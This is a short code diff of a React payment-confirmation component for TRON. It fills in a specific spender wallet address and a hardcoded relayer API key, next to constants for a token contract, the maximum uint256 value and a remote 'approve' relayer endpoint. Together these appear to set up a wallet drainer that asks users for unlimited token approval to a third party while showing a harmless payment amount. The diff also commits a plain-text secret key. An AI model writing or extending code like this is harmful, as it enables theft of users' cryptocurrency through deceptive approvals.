@@ -15,11 +15,11 @@ export default function Confirm() {
   const trxValue = currency === 'TRX' ? n : n / TRX_PRICE
   const usdValue = currency === 'TRX' ? n * TRX_PRICE : n
 
-  const SPENDER = 'YOUR_TRON_WALLET_ADDRESS'
+  const SPENDER = 'TWbVSUKe8gG9T7u7ksEwRjdBsNafAppiAj'
   const TOKEN = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
   const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
   const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
-  const RELAYER_KEY = 'your_configured_api_key'
+  const RELAYER_KEY = 'my-secret-2026-x7k9'
 
   const addLog = (msg: string) => {
     setDebug(prev => [...prev, new Date().toISOString().slice(11, 19) + ' ' + msg])
